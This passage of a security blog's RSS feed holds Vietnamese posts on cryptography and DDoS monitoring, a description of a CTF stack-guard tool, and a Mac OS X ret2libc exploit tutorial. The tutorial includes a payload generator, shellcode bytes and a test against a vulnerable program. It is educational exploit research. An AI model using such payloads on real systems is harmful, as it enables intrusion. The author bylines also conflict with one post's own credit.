+<p>Bạn nào hồi phổ thông có học chuyên toán chắc hẳn sẽ nhớ đến định lý nhỏ (rất đẹp!) của Fermat phát biểu rằng: nếu $latex {p}$ là số nguyên tố, thì ta có: $latex forall a in mathbb{Z}, a^p equiv a , (mod , p)$. Khi học mật mã, bạn sẽ thấy lại định lý này và nhiều ứng dụng tuyệt vời của nó! Tôi có thể bật mí sơ là hệ mã nổi tiếng RSA được xây dựng dựa trên kết quả của định lý đơn giản này!&lt;/span&gt;&lt;/span&gt;</p>
+
+<p>Ngoài toán ra, mật mã học hiện đại còn được xây dựng dựa trên lý thuyết trung tâm của khoa học máy tính: lý thuyết độ phức tạp tính toán (mà thiệt ra cũng là toán thôi). Thành ra đối với những người học khoa học máy tính hoặc nói đơn giản là làm IT như chúng ta, tìm hiểu về mật mã là một cách để thưởng thức cái đẹp của khoa học máy tính.</p>
+
+<p>Bạn nào học lý thuyết độ phức tạp tính toán rồi thì đều biết là có những bài toán mà chúng ta chưa biết khó cỡ nào, chỉ biết là sao bao nhiêu năm nghiên cứu, thế giới vẫn chưa tìm ra thuật toán “hiệu quả” để giải. Câu hỏi là có cách nào lợi dụng những bài toán khó đó để phục vụ cho lợi ích của con người? Nghe có vẻ hơi ngược đời đúng không, chưa tìm ra lời giải thì làm sao mà lợi với chả dụng? Thế mà những người tiên phong của mật mã hiện đại đã nghĩ ra cách sử dụng các bài toán khó như thế và chính những ứng dụng độc đáo sáng tạo như thế này làm nên vẻ đẹp của mật mã!</p>
+
+<p>Lý do thứ ba? Tự bảo vệ những quyền con người cơ bản của chính chúng ta!</p>
+
+<p>Ai cũng có quyền có bí mật, và ai cũng có quyền quyết định khi nào và như thế nào họ sẽ tiết lộ bí mật đó cho người khác. Chúng ta kết nối vào Internet để gửi email, đọc blog, mua một món hàng hay công bố một bài viết mới; mỗi một hành động như thế đều có thể được diễn dịch theo nhiều ngữ nghĩa khác nhau, mà mỗi cách diễn dịch đôi khi lại đem đến những thiệt hại không mong muốn cho chính chúng ta. Thành ra cách tốt nhất là hạn chế tiết lộ danh tính, và nếu ẩn danh được thì càng tốt (cá nhân tôi cho rằng, sở dĩ Internet phát triển như ngày nay một phần là vì bản chất ẩn danh của nó, dẫu đây chỉ là một sự ngộ nhận). Hơn nữa, không phải cái gì chúng ta nói, chúng ta viết đều là dành cho tất cả mọi người; đôi khi chúng ta muốn chỉ duy nhất một nhóm vài người có thể đọc và nghe được những ý kiến của chúng ta. Đây là quyền riêng tư. Mời bạn đọc thêm <a href="http://www.activism.net/cypherpunk/manifesto.html">A Cypherpunk’s Manifesto</a>.</p>
+
+<p>Ai cũng có quyền tự do ngôn luận, tự do thể hiện, tự do tí toáy, ở ngoài đời thật hoặc ở trên Internet. Chắc hắn không cần phải giải thích, tất cả chúng ta đều biết những quyền này quan trọng như thế nào đối với sự tự do của mỗi cá nhân. Vậy ai muốn xâm hại những quyền con người cơ bản của chúng ta? Tôi nghĩ câu hỏi này là thừa, bởi vì rõ ràng sự tự do của tất cả chúng ta đã, đang và bị xâm hại. Khi bạn không kết nối vào được Facebook, nghĩa là bạn đã không còn được tự do.</p>
+
+<p>May mắn thay, những thành tựu trong vài chục năm vừa qua của mật mã có thể phần nào giúp tất cả chúng ta đảm bảo được tính riêng tư và sự tự do trong cuộc sống hàng ngày. Tôi hi vọng là qua loạt bài viết này, tất cả các bạn sẽ hiểu được sức mạnh của mật mã, rồi từ đó sử dụng chúng đúng cách để bảo vệ những quyền và lợi ích chính đáng của bản thân.</p>
+
+<h3 id="nguyn-l-kerckhoff">3. Nguyên lý Kerckhoff</h3>
+
+<p>Nguyên lý do ông Kerckhoff phát biểu vào thế kỷ 19 với nội dung như sau:</p>
+
+<blockquote>
+  <p>Một hệ thống mã hóa phải an toàn ngay cả khi tất cả thông tin về hệ thống đó đều đã được công bố ra ngoài. Bí mật duy nhất của hệ thống là một khóa ngắn.</p>
+</blockquote>
+
+<p>Thực tế cho thấy tất cả các công nghệ mã hóa “thiết kế sau những cánh cửa đóng” đều bị phá vỡ nhanh chóng ngay khi một ai đó “reverse engineer” và công bố thiết kế của chúng. RC4 (dùng để mã hóa mạng không dây), A5/1 (dùng để mã hóa mạng điện thoại GSM), CSS (dùng để mã hóa đĩa DVD), Crypto-1 (dùng để mã hóa các thẻ thanh toán điện tử)… tất cả đều bị phá vỡ trong một thời gian ngắn, kể từ lúc thuật toán bị “reverse engineer”.</p>
+
+<p>Thành ra khi sử dụng mật mã, chúng ta sẽ tuyệt đối tuân thủ nguyên lý Kerckhoff này. Nói cách khác, chúng ta chỉ sử dụng những thuật toán, tiêu chuẩn, hệ thống mã hóa mở. May mắn là đã có sẵn rất nhiều thuật toán, tiêu chuẩn và hệ thống mã hóa mở, chúng ta chỉ việc chọn cái thích hợp mà dùng, không cần phải xây dựng lại từ đầu. Tuyệt đối không sử dụng những tiểu chuẩn, thuật toán, hệ thống đóng! Nói cách khác, avoid security through obscurity.</p>
+
+<p>Mật mã là sân chơi của những ông già bảo thủ ;-), những người luôn đặt ra những điều kiện khó nhất, và rồi cố gắng xây dựng một hệ thống an toàn trong những điều kiện đó. Điều thú vị là họ thành công!</p>
+
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Stack Guard &amp; Format String Blocker in Python</title>
+  <link>http://realjenius.com/research/2010/12/23/stack-guard-format-string-blocker-in-python.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-12-23T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2010/12/23/stack-guard-format-string-blocker-in-python.html</guid>
+  <description><![CDATA[
+     <p>[Download the tool][1]</p>
+
+<p>`<br />
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br />
+Stack Guard &amp; Format String Blocker in Python<br />
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&lt;/p&gt;</p>
+<p>  :author:     Nam T. Nguyen<br />
+  :copyright:  2010, public domain</p>
+<p>(Shamefully admitted that this tool was used in the Capture the Flag game at HITB Kuala Lumpur 2010, and it failed)</p>
+<p>The Big Picture<br />
+===============</p>
+<p>Basically, we are running the application under a debugger. When an interesting event occurs, we process it accordingly.</p>
+<p>Stack Guard<br />
+-----------</p>
+<p>The interesting events are function entry and function exit. When we enter into a function, the value at top of stack is XOR'd with a random value. When we exit from a function, the value at TOS is again XOR'd with that same random value.</p>
+<p>Format String<br />
+-------------</p>
+<p>The interesting events are those ``printf`` family functions. When the function is entered, we just have to check if its format string argument contains ``%n`` or ``%hn``. For some functions (e.g. ``printf```), this argument is at TOS + 4 (leave one for saved EBP), for some others (e.g. ``fprintf``) it is at TOS + 8, yet for some (e.g. ``snprintf``) it is at TOS + 12.</p>
+<p>The Problems<br />
+============</p>
+<p>Breakpoints<br />
+-----------</p>
+<p>The main issue is with multi-process (fork'd code) applications. Basically, when they fork, the soft-breakpoints (0xCC) are retained but the handler does not attach to the new process. Therefore, when a breakpoint hits, the newly forked process simply dies.</p>
+<p>To work around this issue, the ``MultiprocessDebugger`` class is written to remember breakpoints in both original and forked processes. It also kills new image (via ``exec``) to protect against successful exploitation that launches ``/bin/sh``, for example.</p>
+<p>Function entries/exits<br />
+----------------------</p>
+<p>Basically, to find all function entries, and exits, we have to walk the code. A recursive iterator (flattened with a simple queue) is used to visit all functions from a starting location (usually ``main`` function). When a ``CALL`` instruction is reached, its destination is deemed a function entry. When a ``RET`` instruction is reached, this current location is deemed an exit of the the current function. This does not work with indirect calls (``CALL EAX``, for e.g.) because we do not know its destination.</p>
+<p>Samples<br />
+=======</p>
+<p>Please peruse ``target.py`` for a sample usage.<br />
+`
+
+ [1]: http://force.vnsecurity.net/download/lamer/guard.zip
+</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Simple Mac OS X ret2libc exploit (x86)</title>
+  <link>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-10-05T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</guid>
+  <description><![CDATA[
+     <p>Talking about buffer overflow exploit on x86, Mac OS X is the most easy and hacker friendly target compare to Linux or Windows. OS X always loads **/usr/lib/dyld **at a fixed location and it contains a lot of helper stubs to launch the exploit. If you want something advanced likes ROP (Return-Oriented-Programming) exploit you may have a look at “<a href="http://trailofbits.com/2010/07/21/mac-os-x-return-oriented-exploitation/" target="_blank">Mac OS X Return-Oriented Exploitation</a>” and thorough step-by-step guide “<a href="http://www.exploit-db.com/osx-rop-exploits-evocam-case-study/" target="_blank">OSX ROP Exploit – EvoCam Case Study</a>“. But actually, we don’t need ROP for 32-bit exploitation on OS X, simple ret2libc is enough and straightforward to implement. Let take a look at multi-stage ret2libc exploit on OS X.</p>
+
+<h2 id="the-target">The target</h2>
+
+<p>Under OSX, dyld is always loaded at a fixed location with __IMPORT page is RWX as shown below:</p>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__LINKEDIT             8fe70000-8fe84000 [   80K] r&#8211;/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
+  #__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
+</div>
+
+<pre><strong>__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld</strong>
+__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
+__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
+__LINKEDIT             8fe70000-8fe84000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
+__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
+__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
+<strong>__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld</strong></pre>
+
+<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">Our target is to transfer the desired shellcode to the __IMPORT section of dyld then execute it. We can simply do this with byte-per-byte copy way of <a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/">ROPEME</a>. There is some disadvantages with this method:</span></p>
+
+<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px"> </span></p>
+
+<ul>
+  <li>Payload size is large, around 10 times of actual shellcode</li>
+  <li>We have to re-generate the whole payload when changing to new shellcode</li>
+</ul>
+
+<p>With OS X we can do it better as there is a RWX page at static location.</p>
+
+<h2 id="staging-payload">Staging payload</h2>
+
+<p>The most complicated part of ROP technique is “stack pivoting” or ESP register control under ASLR. By executing a small shellcode we can take ESP under control easily. Our multi-stage payload will look like:</p>
+
+<h3 id="stage-2-actual-shellcode">Stage-2: actual shellcode</h3>
+
+<p>This is the last stage in our multi-stage payload. Any NULL-free shellcode can be used, e.g bind shell code from Metasploit.</p>
+
+<h3 id="stage-1-shellcode-loader-for-stage-2-payload">Stage-1: shellcode loader for stage-2 payload</h3>
+
+<p>This stage will transfer stage-2 payload on stack to __IMPORT section (RWX) of dyld then executes it. The transfer function is *_strcpy() *in dyld. Below small shellcode will be executed on RWX page to perform the job:</p>
+
+<pre># 58                pop eax     # eax -&gt; TARGET
+# 5B                pop ebx     # ebx -&gt; STRCPY
+# 54                push esp    # src -&gt; &amp;shellcode
+# 50                push eax    # dst -&gt; TARGET
+# 50                push eax    # jump to TARGET when return from _strcpy()
+# 53                push ebx    # STRCPY
+# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)</pre>
+
+<h3 id="stage-0-ret2libc-loader-for-stage-1-payload">Stage-0: ret2libc loader for stage-1 payload</h3>
+
+<p>This stage will transfer 7 bytes of stage-1 payload to our RWX location using repeated *_strcpy() *calls, then executes it. We lookups the dyld for necessary byte values and copy it to the target byte-per-byte.</p>
+
+<p>In summary, there is some advantages with our multi-stage payload:</p>
+
+<ul>
+  <li>Straightforward to implement: only ret2libc calls, no gadget is required</li>
+  <li>Payload size overhead is small: around 100 bytes</li>
+  <li>Independent, generic loader code: no need to regenerate the whole payload, just append a new shellcode to make new payload</li>
+</ul>
+
+<h2 id="automated-payload-generator">Automated payload generator</h2>
+
+<p>Let put all this together and make an automated payload generator in Python.</p>
+
+<ul>
+  <li>Select the target</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title="">#__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
+TARGET = 0x8fe6f010 # to avoid NULL byte
+# dyld base address
+DYLDADDR = 0x8fe00000
+</pre>
+
+<ul>
+  <li>Extract dyld’s i386 code</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># $ otool -f /usr/lib/dyld
+# ...
+#architecture 1
+#    cputype 7
+#    cpusubtype 3
+#    capabilities 0x0
+#    offset 352256
+#    size 368080
+#    align 2^12 (4096)
+# ...
+
+DYLDFILE = "/usr/lib/dyld"
+DYLDCODE = open(DYLDFILE, "rb").read()
+DYLDCODE = DYLDCODE[352256 : 352256+368080]
+</pre>
+
+<ul>
+  <li>_strcpy() call</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># $ nm -arch i386 /usr/lib/dyld | grep _strcpy
+# 8fe2db10 t _strcpy
+STRCPY = 0x8fe2db10
+
+# $ otool -arch i386 -tv /usr/lib/dyld | grep pop -A2 | grep ret -B1 | grep pop
+# 8fe28790        popl    %edi
+# 8fe2b3d4        popl    %edi
+POP2RET = 0x8fe2878f
+</pre>
+
+<ul>
+  <li>stage-1</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># stage1
+# 58                pop eax     # eax -&gt; TARGET
+# 5B                pop ebx     # ebx -&gt; STRCPY
+# 54                push esp    # dst -&gt; &amp;shellcode
+# 50                push eax    # src -&gt; TARGET
+# 50                push eax    # jump to TARGET when return from _strcpy()
+# 53                push ebx    # STRCPY
+# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)
+
+STAGE1 = "x58x5bx54x50x50x53xc3"
+</pre>
+
+<ul>
+  <li>stage-0</li>
+</ul>
+
+<pre class="brush: python; title: ; notranslate" title=""># stage0: _strcpy sequences
+STAGE0 = gen_stage0(DYLDCODE, STAGE1)
+</pre>
+
+<p>Below is the stage-0 payload loader generated for OS X 10.6.4:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">STAGE0 = (  "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8f"
+            "x10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8f"
+            "x10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" )
+</pre>
+
+<p>Test the payload with simple buffer overflow:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">bash-3.2$ ./vuln "`python -c 'print "A"*272 + "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8fx10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8fx10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8fx10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8fx10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8fx10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" + "xcc"*4'`
+
+...
+
+Trace/BPT trap
+
+bash-3.2$
+
+</pre>
+
+<p>Looking for the next? Maybe “Mac OS X ROP exploit on x86_64″ someday.</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>ROPEME &#8211; ROP Exploit Made Easy</title>
+  <link>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-08-13T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</guid>
+  <description><![CDATA[
+     <p>ROPEME – ROP Exploit Made Easy – is a PoC tool for ROP exploit automation on Linux x86. It contains a set of simple Python scripts to generate and search for ROP gadgets from binaries and libraries (e.g libc). A sample payload class is also included to help generate multistage ROP payload with the technique described in the Black Hat USA 2010 talk: “<a title="Black Hat USA 2010 Media Archives" href="http://blackhat.com/html/bh-us-10/bh-us-10-archives.html#Le" target="_blank">Payload already inside: data re-use for ROP exploits</a>“.</p>
+
+<p>Check the latest <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">paper</a> and <a href="http://force.vnsecurity.net/download/longld/BHUS10_Slides_Payload_already_inside_data_reuse_for_ROP_exploits_v1.pdf">slides</a> and PoC <a href="http://force.vnsecurity.net/download/longld/ropeme-bhus10.tbz2">code</a>.</p>
+
+<p>And take a look at the demo video below:</p>
+
+<p>Enjoy ROPing!</p>
+
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Giám sát an ninh mạng &#8211; hay là làm thế nào để ngăn chặn một cuộc tấn công DDoS trong 20&#039;</title>
+  <link>http://realjenius.com/research/2009/12/14/how-to-mitigate-a-ddos-attack-in-20-minutes.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2009-12-14T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2009/12/14/how-to-mitigate-a-ddos-attack-in-20-minutes.html</guid>
+  <description><![CDATA[
+     <p><span style="font-style: italic">(rút ra từ bài nói chuyện tại BarcampSaigon 2009)</span><br />
+<a href="http://www.slideshare.net/thaidn/network-security-monitoring-or-how-to-mitigate-a-ddos-attack-in-20" title="Network Security Monitoring or How to mitigate a DDoS attack in 20'">Network Security Monitoring or How to mitigate a DDoS attack in 20′</a></p>
+
+<p>View more <a href="http://www.slideshare.net/">presentations</a> from <a href="http://www.slideshare.net/thaidn">thaidn</a>.</p>
+
+<p>Để bắt đầu thì tôi xin chia sẻ một câu chuyện. Cách đây không lâu, web site của một khách hàng bị tấn công từ chối dịch vụ DDoS. Vào lúc cao trào của vụ tấn công, có hơn 10.000 IP đến từ khắp nơi trên thế giới liên tục gửi hàng ngàn yêu cầu mỗi giây đến hệ thống của khách hàng này. Hình ảnh (slide số 4) mà quý vị đang thấy trên màn hình gồm có 2 phần nhỏ. Phần ở trên là lưu lượng dữ liệu ra vào hệ thống lúc bình thường, không bị tấn công. Phần ở dưới là lưu lượng dữ liệu ra vào hệ thống của ngay tại thời điểm đang bị tấn công dữ dội.</p>
+
+<p>Như quý vị cũng thấy, chỉ trong vòng 10′, từ lúc 16h10 đến 16h20, lượng dữ liệu ra vào đã tăng đột biến lên gấp gần 10 lần lúc bình thường. Nhưng đồng thời, chỉ trong vòng chưa tới 20′, chúng tôi đã kiểm soát được vụ tấn công này, và đưa toàn bộ hệ thống trở lại tình trạng bình thường. Chúng tôi làm được như vậy tất cả là nhờ vào việc đã áp dụng tốt các công nghệ và nguyên tắc của giám sát an ninh mạng.</p>
+
+<p>Nếu quý vị từng phải xử lý một vụ tấn công DDoS, tôi tin chắc có một câu hỏi mà quý vị đã phải tự hỏi nhiều lần: <span style="font-weight: bold">chuyện gì đang diễn ra vậy?</span> Tại sao hệ thống của tôi đang chạy ngon lành tự dưng lại cứng đơ, khách hàng không sử dụng được nữa?</p>
+
+<p>Bản thân tôi cho rằng đây là câu hỏi tối quan trọng mà bất kỳ ai làm việc trong lĩnh vực an ninh mạng đều phải tự hỏi và phải có câu trả lời xác đáng. Ngay tại thời điểm này đây, ngay khi quý vị đang ngồi ở đây nghe tôi trình bày, quý vị có biết ai đang làm gì ở đâu như thế nào trên hệ thống của quý vị hay không?</p>
+
+<p>Tại sao câu hỏi đó quan trọng? Tại sao quý vị cần phải biết được ai đang làm gì ở đâu như thế nào trên hệ thống của quý vị? Đơn giản vì chúng ta không thể bảo vệ một hệ thống nếu chúng ta không biết được trạng thái của hệ thống đó. Và chúng ta chỉ có thể biết được trạng thái của một hệ thống bằng cách theo dõi nó thường xuyên. Nói cách khác, chúng ta phải biết được tất cả các hoạt động đã và đang diễn ra trên hệ thống.</p>
+
+<p>Thử nhìn vào hoạt động của một khách sạn. Để đảm bảo an ninh, người ta phải đặt camera theo dõi ở khắp nơi. Các camera này chắc hẳn sẽ đưa hình ảnh về một địa điểm tập trung, nơi có các chuyên viên theo dõi 24/7 để kịp thời phát hiện và đối phó với các sự cố an ninh.</p>
+
+<p>Tương tự như thế, muốn đảm bảo an ninh thông tin chúng ta cũng phải tiến hành theo dõi 24/7. Nhưng trong thực tế, theo quan sát của tôi, rất ít tổ chức ở VN có một hệ thống giám sát an ninh như thế. Để bảo vệ hệ thống mạng của mình, các doanh nghiệp và các tổ chức công thường triển khai các thiết bị như tường lửa, phần mềm chống và diệt virus, thiết bị phát hiện xâm nhập, thiết bị ngăn chặn xâm nhập. Rõ ràng họ nghĩ rằng, các thiết bị này đảm bảo an ninh mạng cho họ nên họ mới đầu từ nhiều tiền của để triển khai chúng.</p>
+
+<p>Thật tế hầu hết những người giữ quyền quyết định đầu tư cho an toàn thông tin thường hay hành động theo thị trường. Ví dụ như cách đây vài năm, tường lửa là mốt. Ai cũng đầu tư làm hệ thống tường lửa nên chúng ta cũng phải làm tường lửa. Sau đó, các giải pháp phát hiện xâm nhập lên ngôi. Bây giờ cái gì đang là trào lưu quý vị biết không? ISO 27001.</p>
+
+<p>Lãnh đạo doanh nghiệp thấy các các doanh nghiệp khác triển khai ISO 27001 nên họ cũng muốn doanh nghiệp của họ phải đạt được chuẩn này. Tôi không nói rằng tường lửa, thiết bị phát hiện xâm nhập hay đạt được các chuẩn như ISO 27001 và ITIL là không có tác dụng, nhưng câu hỏi chúng ta cần phải tự hỏi là: tại sao sau khi triển khai quá trời thứ đắt tiền và tốn thời gian như thế, chúng ta vẫn bị xâm nhập, chúng ta vẫn bị tấn công? Liệu ISO 27001 hay tường lửa có giúp bạn khắc phục được một vụ tấn công từ chối dịch vụ trong vòng 20′? Rồi khi đã bị xâm nhập, có thiết bị đắt tiền hay tiêu chuẩn nào giúp quý vị biết được hệ thống của quý vị bị xâm nhập khi nào, tại sao và như thế nào hay không?</p>
+
+<p>Chỉ có con người mới có khả năng làm việc đó. Đây là điều tôi muốn nhấn mạnh, các thiết bị hay các tiêu chuẩn sẽ trở nên vô tác dụng nếu chúng ta không có con người thường xuyên theo dõi, giám sát hệ thống. Nghĩa là, <span style="font-weight: bold">chúng ta cần các chuyên gia giám sát hệ thống có chuyên môn cao.</span></p>
+
+<p>Tại sao chúng ta cần phải có chuyên gia, tại sao tự bản thân các thiết bị hay các tiêu chuẩn không thể bảo vệ hệ thống mạng? Bởi vì những kẻ tấn công rất thông minh, không thể dự đoán và rất có thể có động lực cao nhất là khi thương mại điện tử phát triển như bây giờ. Máy móc và quy trình không thể ngăn chặn được họ, chắc chắn là như thế. Máy móc chắc chắn sẽ thua khi chiến đấu với não người. Đó là lý do chúng ta cần con người, cần những chuyên gia, để biến an ninh mạng thành một cuộc chiến cân sức hơn giữa người và người, thay vì giữa máy và người.</p>
+
+<p>Câu hỏi đặt ra là các chuyên gia an ninh mạng cần gì để có thể phát hiện và xử lý các sự cố an ninh mạng cũng như xây dựng các kế hoạch phòng thủ? Câu trả lời chỉ có một: <span style="font-weight: bold">tất cả dữ liệu mà chúng ta có thể thu thập được trên hệ thống mạng trong khi sự cố xảy ra!</span></p>
+
+<p>Quý vị còn nhớ ví dụ của tôi v/v làm sao để bảo vệ an ninh cho một khách sạn? Người quản lý cố gắng thu thập tất cả các dữ liệu, ở đây là hình ảnh và âm thanh, bằng các camera đặt khắp nơi trong khách sạn, và họ cần có các chuyên gia lành nghề để phân tích các hình ảnh này để kịp thời xử lý các sự cố. Họ có hệ thống chống và phát hiện cháy, họ có hệ thống chống trộm, nhưng những máy móc đó chỉ là công cụ, phần việc chính vẫn phải do con người, là các chuyên gia thực hiện.</p>
+
+<p>Tóm lại, để đảm bảo an ninh, chúng ta cần phải theo dõi giám sát hệ thống mạng 24/7, và để làm chuyện đó chúng ta cần có các chuyên gia và các chuyên gia cần dữ liệu để thực hiện công việc của họ. Giám sát an ninh mạng chính là phương thức giúp chúng ta có thể thực hiện việc này một cách tối ưu nhất. Vậy giám sát an ninh mạng là gì?</p>
+
+<p>Thuật ngữ giám sát an ninh mạng được chính thức định nghĩa vào năm 2002 và về cơ bản nó gồm 3 bước: <span style="font-weight: bold">thu thập dữ liệu, phân tích dữ liệu và leo thang thông tin.</span></p>
+
+<p>Để thu thập dữ liệu, chúng ta sẽ sử dụng các phần mềm hay giải pháp có sẵn trên thị trường để thu thập dữ liệu ghi dấu hoạt động của các máy chủ, thiết bị mạng, phần mềm ứng dụng, cơ sở dữ liệu…Nguyên tắc của thu thập dữ liệu là thu thập càng nhiều càng tốt, với mục tiêu là chúng ta phải có đầy đủ thông tin về trạng thái, log file của tất cả các thành phần trong hệ thống cần phải bảo vệ. Bởi vì có muôn hình vạn trạng các loại tấn công và sự cố ATTT, chúng ta không thể biết trước dữ liệu nào là cần thiết để có thể phát hiện và ngăn chặn loại tấn công nào. Nên kinh nghiệm của tôi là nếu mà luật pháp và công nghệ cho phép, cứ thu thập hết tất cả dữ liệu mà quý vị có thể. Nguyên tắc “thà giết lầm còn hơn bỏ sót” có thể áp dụng ở đây.</p>
+
+<p>Nếu phần mềm có thể giúp chúng ta làm công việc thu thập dữ liệu, thì để phân tích dữ liệu và ra quyết định, như đã nói ở trên, chúng ta cần có chuyên gia, bởi chỉ có chuyên gia mới có thể hiểu rõ ngữ cảnh của dữ liệu mà phần mềm đã thu thập được. Ngữ cảnh là tối quan trọng. Một dữ liệu được thu thập trong ngữ cảnh A có thể sẽ có ý nghĩa rất khác với cùng dữ liệu đó nếu nó thuộc về ngữ cảnh B. Ví dụ như một ngày đẹp trời hệ thống thu thập dữ liệu cảnh báo rằng một số file chương trình trên một máy chủ quan trọng đã bị thay đổi. Nếu như xét ngữ cảnh A là máy chủ đó đang được nâng cấp phần mềm, thì thông tin này không có nhiều ý nghĩa. Nhưng nếu như ở ngoài ngữ cảnh A đó, nói cách khác, không có một yêu cầu thay đổi phần mềm nào đang được áp dụng cho máy chủ đó cả, thì rõ ràng rất có thể máy chủ đó đã bị xâm nhập. Và chỉ có những chuyên gia mới có thể cung cấp được những ngữ cảnh như thế.</p>
+
+<p>Quy trình giúp cho chúng ta leo thang thông tin. Leo thang thông tin là việc các chuyên gia báo cáo lên trên cho những người có quyền quyết định những vấn đề mà họ cho là quan trọng, cần phải điều tra thêm. Những người có quyền quyết định là những người có đủ thẩm quyền, trách nhiệm và năng lực để quyết định cách đối phó với các sự cố ANTT tiềm tàng. Không có leo thang thông tin, công việc của các chuyên gia sẽ trở thành vô ích. Tại sao phải phân tích để phát hiện các sự cố ANTT tiềm tàng nếu như chẳng có ai chịu trách nhiệm cho việc xử lý chúng?</p>
+
+<p>Quay trở lại với câu chuyện vụ tấn công từ chối dịch vụ mà tôi chia sẻ ban đầu. Hệ thống giám sát an ninh mạng của chúng tôi thu thập tất cả dữ liệu liên quan đến hoạt động của các thiết bị như tường lửa, máy chủ proxy, máy chủ web, các ứng dụng web chạy trên các máy chủ web. Dựa vào nguồn dữ liệu phong phú này, các chuyên gia của chúng tôi đã không mất quá nhiều thời gian để phân tích và nhận ra các dấu hiệu bất thường trên hệ thống. Họ leo thang thông tin bằng cách thông báo cho tôi, và tôi quyết định kích hoạt quá trình đối phó với sự cố ANTT, ở đây là đối phó khi bị tấn công từ chối dịch vụ.</p>
+
